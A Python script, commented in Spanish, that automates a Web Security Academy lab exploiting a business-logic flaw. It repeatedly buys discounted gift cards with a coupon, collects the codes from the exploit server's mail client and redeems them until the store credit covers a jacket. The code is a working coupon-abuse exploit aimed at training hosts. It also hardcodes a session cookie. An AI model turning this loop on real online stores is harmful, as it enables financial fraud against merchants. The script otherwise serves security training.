import re
import threading
import time

import requests
from bs4 import BeautifulSoup

# --- CONFIGURACIÓN ---
BASE = "https://0ad20019044cd5128233f7b300e10014.web-security-academy.net"
EXPLOIT_SERVER = "https://exploit-0ad1007c042ad5a18224f61e01c90007.exploit-server.net"
EXPLOIT_EMAIL = EXPLOIT_SERVER + "/email"
SESSION_COOKIE = "TPlBDC7ZkRoEvxcpfgvGejWstv3CL02Z"

TARGET_CREDIT = 1400        # crédito necesario para comprar la chaqueta
GIFT_CARD_QTY = 3             # 3 * $10 = $30, -30% = $21 pagados por ciclo
JACKET_PRODUCT_ID = "1"       # Lightweight l33t leather jacket
GIFT_CARD_PRODUCT_ID = "2"

burp0_headers = {
    "Cache-Control": "max-age=0",
    "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\"",
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": "\"Windows\"",
    "Accept-Language": "es-ES,es;q=0.9",
    "Upgrade-Insecure-Requests": "1",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
    "Origin": BASE,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Referer": BASE + "/my-account?id=wiener",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=0, i",
}

# Sesión única: mantiene la cookie sincronizada con el CSRF de cada página.
s = requests.Session()
s.headers.update(burp0_headers)
s.cookies.set("session", SESSION_COOKIE)

CSRF_RE = re.compile(r'name="csrf"\s+value="([^"]+)"')


def get_csrf(path):
    """Lee el token CSRF fresco del HTML de la página indicada."""
    html = s.get(BASE + path).text
    match = CSRF_RE.search(html)
    if not match:
        raise RuntimeError(f"No se encontró el CSRF en {path}. ¿Sesión caducada?")
    return match.group(1)


def change_email(email):
    s.post(
        BASE + "/my-account/change-email",
        data={"email": email, "csrf": get_csrf("/my-account")},
    )


def add_to_cart(product_id, quantity=1):
    # El formulario del carrito no lleva CSRF.
    s.post(
        BASE + "/cart",
        data={"productId": str(product_id), "redir": "PRODUCT", "quantity": str(quantity)},
    )


def apply_discount_code(code="SIGNUP30"):
    s.post(
        BASE + "/cart/coupon",
        data={"csrf": get_csrf("/cart"), "coupon": code},
    )


def make_checkout():
    s.post(
        BASE + "/cart/checkout",
        data={"csrf": get_csrf("/cart")},
    )


# Los códigos de gift card llegan por correo al email client del exploit server,
# no en la respuesta del checkout. Cada email es un <pre> con el texto
# "Your gift card code is:" seguido del código en su propia línea.
GIFT_CODE_RE = re.compile(r'Your gift card code is:\s*([A-Za-z0-9]+)')


def get_gift_cards():
    """Devuelve la lista de códigos de gift card presentes en el email client."""
    soup = BeautifulSoup(s.get(EXPLOIT_EMAIL).text, "html.parser")
    codes = []
    for pre in soup.find_all("pre"):
        match = GIFT_CODE_RE.search(pre.get_text())
        if match:
            codes.append(match.group(1))
    return codes


def reclaim_gift_card(gift_card):
    """Canjea un código de gift card por crédito de tienda."""
    return s.post(
        BASE + "/gift-card",
        data={"csrf": get_csrf("/my-account"), "gift-card": gift_card},
    )


def store_credit():
    """Devuelve el crédito actual de la tienda como float."""
    html = s.get(BASE + "/my-account?id=wiener").text
    match = re.search(r'Store credit: \$([\d.]+)', html)
    return float(match.group(1)) if match else 0.0


def buy_jacket():
    """Compra final de la chaqueta para resolver el lab."""
    add_to_cart(JACKET_PRODUCT_ID, quantity=1)
    make_checkout()


# --- Estado compartido entre hilos ---
redeemed = set()              # códigos ya reclamados (memoria anti-duplicados)
redeemed_lock = threading.Lock()
stop_event = threading.Event()  # señal para que ambos hilos terminen


def claim_new_codes():
    """Reclama los códigos que aún no estén en `redeemed`. Devuelve cuántos reclamó."""
    nuevos = 0
    for code in get_gift_cards():
        with redeemed_lock:
            if code in redeemed:
                continue
            redeemed.add(code)   # se marca antes de reclamar para que otro hilo no lo repita
        reclaim_gift_card(code)
        nuevos += 1
    return nuevos


def buyer_worker():
    """Hilo productor: compra gift cards de a GIFT_CARD_QTY con el cupón, en bucle."""
    i = 1
    while not stop_event.is_set():
        email = f"wiener{i}@exploit-0ad1007c042ad5a18224f61e01c90007.exploit-server.net"
        change_email(email)
        add_to_cart(GIFT_CARD_PRODUCT_ID, quantity=GIFT_CARD_QTY)
        apply_discount_code("SIGNUP30")
        make_checkout()
        print(f"[compra {i}] {GIFT_CARD_QTY} gift cards con SIGNUP30")
        i += 1


def redeemer_worker():
    """Hilo consumidor: escanea el correo y reclama los códigos nuevos."""
    while not stop_event.is_set():
        nuevos = claim_new_codes()
        if nuevos:
            print(f"[canje] +{nuevos} códigos (total reclamados: {len(redeemed)})")
        time.sleep(1)


def main():
    credit = store_credit()
    print(f"Crédito inicial: ${credit:.2f}")

    buyer = threading.Thread(target=buyer_worker, name="buyer", daemon=True)
    redeemer = threading.Thread(target=redeemer_worker, name="redeemer", daemon=True)
    buyer.start()
    redeemer.start()

    # El hilo principal vigila el crédito y detiene a los trabajadores al llegar al objetivo.
    while credit < TARGET_CREDIT:
        time.sleep(3)
        credit = store_credit()
        print(f"[estado] crédito=${credit:.2f}  reclamados={len(redeemed)}")

    stop_event.set()
    buyer.join(timeout=15)     # el ciclo en curso termina completo (deja el carrito vacío)
    redeemer.join(timeout=15)

    # Drenaje final: reclamar cualquier código que quedara pendiente.
    claim_new_codes()
    credit = store_credit()

    print(f"\nCrédito suficiente (${credit:.2f}). Comprando la chaqueta...")
    buy_jacket()
    print("Hecho. Revisa el lab: debería estar marcado como 'Solved'.")


if __name__ == "__main__":
    main()
